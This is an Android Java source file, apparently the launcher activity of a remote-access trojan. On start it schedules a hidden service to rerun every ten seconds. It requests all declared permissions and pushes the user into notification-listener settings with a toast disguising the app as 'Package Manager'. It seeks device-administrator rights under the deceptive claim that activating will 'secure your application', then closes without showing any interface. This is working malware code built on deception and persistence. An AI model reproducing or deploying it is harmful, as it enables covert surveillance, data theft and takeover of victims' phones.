package com.remote.app;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;


public class MainActivity extends Activity {

    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PackageInfo info = null;

        setContentView(R.layout.activity_main);
//        startService(new Intent(this, MainService.class));
        Intent intent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);
        boolean isNotificationServiceRunning = isNotificationServiceRunning();
        if(!isNotificationServiceRunning){

            Context context = getApplicationContext();
            String[] permissions = new String[]{};
            try {
                info = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
                permissions = info.requestedPermissions;
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
            CharSequence text = "Enable 'Package Manager'\n Click back x2\n and Enable all permissions";
            int duration = Toast.LENGTH_LONG;

            Toast toast = Toast.makeText(context, text, duration);

            TextView v = (TextView) toast.getView().findViewById(android.R.id.message);
            v.setTextColor(Color.RED);
            v.setTypeface(Typeface.DEFAULT_BOLD);
            v.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
            toast.show();

            reqPermissions(this, permissions);

            // spawn notification thing
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

            mDPM = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
            // Set DeviceAdminDemo Receiver for active the component with different option
            mAdminName = new ComponentName(this, DeviceAdminX.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                // try to become active
                Intent intent2 = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent2.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent2.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivity(intent2);
            }

            // spawn app page settings so you can enable all perms
//            Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
//            startActivity(i);
        }

        finish();
    }


    public void reqPermissions(Context context, String[] permissions) {
        if (context != null && permissions != null) {
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }



    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }
}
